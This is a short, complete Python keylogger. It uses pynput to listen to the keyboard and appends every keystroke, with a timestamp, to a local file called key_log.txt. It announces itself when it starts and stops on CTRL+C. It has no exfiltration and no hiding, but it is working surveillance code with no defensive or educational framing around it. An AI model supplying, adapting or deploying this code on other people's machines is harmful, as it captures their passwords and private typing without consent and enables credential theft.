from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{time} - {key.char}\n")
        except AttributeError:
            f.write(f"{time} - {key}\n")

def start_keylogger():
    print("🔐 Keylogger started (Press CTRL+C to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
